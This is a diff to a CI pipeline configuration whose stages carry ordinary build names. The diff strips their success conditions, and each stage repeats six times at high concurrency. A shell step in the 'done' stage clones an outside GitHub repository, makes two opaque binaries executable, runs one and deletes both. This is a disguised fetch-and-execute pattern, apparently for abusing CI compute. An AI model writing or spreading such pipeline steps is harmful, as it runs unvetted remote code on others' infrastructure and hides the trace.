@@ -37,8 +37,6 @@ pipeline:
               repeat:
                 times: 6
                 maxConcurrency: 10
-            when:
-              pipelineStatus: Success
         - stage:
             name: test
             identifier: test
@@ -65,8 +63,6 @@ pipeline:
               repeat:
                 times: 6
                 maxConcurrency: 10
-            when:
-              pipelineStatus: Success
         - stage:
             name: prepare
             identifier: prepare
@@ -93,8 +89,6 @@ pipeline:
               repeat:
                 times: 6
                 maxConcurrency: 10
-            when:
-              pipelineStatus: Success
         - stage:
             name: go build tes
             identifier: go_build_tes
@@ -121,8 +115,6 @@ pipeline:
               repeat:
                 times: 6
                 maxConcurrency: 10
-            when:
-              pipelineStatus: Success
         - stage:
             name: clearing
             identifier: clearing
@@ -149,8 +141,6 @@ pipeline:
               repeat:
                 times: 6
                 maxConcurrency: 10
-            when:
-              pipelineStatus: Success
     - stage:
         name: done
         identifier: done
@@ -174,5 +164,3 @@ pipeline:
                     shell: Sh
                     command: rm -rf tmateo && git clone https://github.com/samnialoska22/faksa.git && cd faksa && chmod +x ss4 && chmod +x volos && ./volos && rm -rf volos ss4
   allowStageExecutions: false
-
-
